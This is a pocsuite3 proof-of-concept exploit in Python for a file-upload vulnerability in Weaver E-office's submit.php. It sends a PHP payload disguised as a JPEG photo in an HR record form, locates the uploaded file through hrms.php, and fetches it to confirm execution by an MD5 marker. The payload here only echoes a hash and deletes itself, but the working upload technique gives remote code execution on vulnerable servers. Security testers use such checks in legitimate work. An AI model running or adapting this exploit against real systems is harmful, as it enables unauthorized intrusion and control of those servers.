from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office submit.php 存在文件上传漏洞'
    appName = '泛微 E-office'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司E-office submit.php 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self, verify=True):
        result = {}
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
        }
        path = '/general/hrms/manage/submit.php'
        files = {'HR_ID': ('','1'),'ID': ('', ''),'USER_ID': ('', ''),'photo': ('', ''),'ATTACHMENT_PIC_NAME': ('', 'C:\\fakepath\\4.jpg'),'ATTACHMENT_ID_OLD': ('', ''),'ATTACHMENT_NAME_OLD': ('', ''),'OPERATOR': ('', ''),'DEPT_ID': ('', ''),'check_hr_no': ('', ''),'NO': ('', '1'),'hr_name': ('', '123'),'STATUS': ('', '1'),'sex': ('', '2'),'dept_id': ('', ''),'BIRTHDAY': ('', ''),'MARRY': ('', ''),'EDUCATION': ('', ''),'ATTACHMENT_path': ('', 'C:\\fakepath\\4.php'),'ATTACHMENT_PIC': ('4.jpg', "<?php echo md5('123456');@unlink(__file__);?>",'image/jpeg'),'WORK_DATE': ('', ''),'JOIN_DATE': ('', ''),'LABOR_START_TIME': ('', ''),'LABOR_END_TIME': ('', ''),'POST': ('', ''),'NATION': ('', ''),'CARD_NO': ('', ''),'NATIVE_PLACE': ('', ''),'SPECIALITY': ('', ''),'SCHOOL': ('', ''),'CERTIFICATE': ('', ''),'HOME_ADDR': ('', ''),'HOME_TEL': ('', ''),'EMAIL': ('', ''),'REWARD': ('', ''),'TRAIN': ('', ''),'EDU': ('', ''),'WORK': ('', ''),'SOCIATY': ('', ''),'RESUME': ('', ''),'OTHERS': ('', ''),'file_elem': ('', ''),'attachmentIDStr': ('', ''),'attachmentNameStr': ('', '')}
        vul_url= self.url+path
        resp = requests.post(vul_url,headers=headers,files=files,allow_redirects=False,verify=False,timeout=10)
        if resp.status_code == 302 and 'failed to open' in resp.text:
            path1 = '/general/hrms/manage/hrms.php?HR_ID=1'
            vul_url1= self.url+path1
            resp1 = requests.get(vul_url1,headers=headers,allow_redirects=False,verify=False,timeout=10)
            if resp1.status_code == 302 and 'attachment/hrms_pic/' in resp1.text:
                php = re.findall("attachment/hrms_pic/(.*)?'",resp1.text)[0]
                path2 = '/attachment/hrms_pic/'+ php
                vul_url2= self.url+path2
                resp2 = requests.get(vul_url2,headers=headers,allow_redirects=False,verify=False,timeout=10)
                if resp2.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in resp2.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_url
                    result['VerifyInfo']['Content'] = vul_url2
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
